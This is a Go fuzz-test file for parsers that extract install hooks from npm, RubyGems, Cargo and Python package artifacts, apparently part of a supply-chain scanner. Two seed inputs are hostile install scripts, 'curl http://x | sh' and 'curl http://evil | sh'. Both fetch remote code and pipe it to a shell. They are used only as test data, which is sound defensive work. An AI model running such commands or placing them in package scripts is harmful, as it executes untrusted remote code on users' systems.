//go:build fuzz
// +build fuzz

// Fuzz targets for the install-hook extraction parsers (Task 62, mirroring the
// Task 30 harness).
//
// Every parser here consumes bytes that originate from an untrusted upstream
// artifact — an npm package.json, a serialized RubyGems gemspec, a Cargo.toml,
// a pyproject.toml, or a whole package archive. They must never panic, must
// bound their work, and must terminate on hostile input (deeply nested JSON,
// truncated archives, pathological YAML). The targets assert only "does not
// panic / does terminate"; correctness is covered by the deterministic golden
// tests.
package installhooks

import (
	"bytes"
	"testing"
)

func FuzzParsePackageJSONScripts(f *testing.F) {
	f.Add([]byte(`{"name":"x","scripts":{"postinstall":"node a.js"}}`))
	f.Add([]byte(`{"scripts":{"preinstall":["curl http://x | sh"]}}`))
	f.Add([]byte(`{`))
	f.Add([]byte(`{"scripts":null}`))
	f.Fuzz(func(t *testing.T, data []byte) {
		scripts, err := ParsePackageJSONScripts(data)
		if err == nil {
			for k := range scripts {
				_ = scripts[k]
			}
		}
	})
}

func FuzzParseGemspecMetadata(f *testing.F) {
	f.Add([]byte("--- !ruby/object:Gem::Specification\nextensions:\n- ext/foo/extconf.rb\npost_install_message: |\n  hi\n"))
	f.Add([]byte("post_install_message: thanks\nextensions: []\n"))
	f.Add([]byte("extensions:"))
	f.Fuzz(func(t *testing.T, data []byte) {
		ext, msg := ParseGemspecMetadata(data)
		_ = ext
		_ = msg
	})
}

func FuzzParseCargoBuildField(f *testing.F) {
	f.Add([]byte("[package]\nname = \"x\"\nbuild = \"build.rs\"\n"))
	f.Add([]byte("[package]"))
	f.Add([]byte("build = "))
	f.Fuzz(func(t *testing.T, data []byte) {
		_ = ParseCargoBuildField(data)
	})
}

func FuzzParsePyprojectBuildBackend(f *testing.F) {
	f.Add([]byte("[build-system]\nbuild-backend = \"setuptools.build_meta\"\n"))
	f.Add([]byte("build-backend = "))
	f.Fuzz(func(t *testing.T, data []byte) {
		_ = ParsePyprojectBuildBackend(data)
	})
}

func FuzzExtractHooks(f *testing.F) {
	// A small valid npm tarball and a python sdist seed the corpus; the rest is
	// arbitrary bytes the archive readers must reject without panicking.
	f.Add(npmTarball(map[string]string{"postinstall": "curl http://evil | sh"}), "npm")
	f.Add([]byte("not a tar at all"), "pip")
	f.Add([]byte{0x1f, 0x8b, 0x08, 0x00}, "cargo")
	f.Fuzz(func(t *testing.T, data []byte, eco string) {
		hooks, _, _ := extractHooks(Artifact{Ecosystem: eco, Name: "x", Version: "1"}, bytes.NewReader(data))
		for i := range hooks {
			_ = hooks[i].Script
		}
	})
}
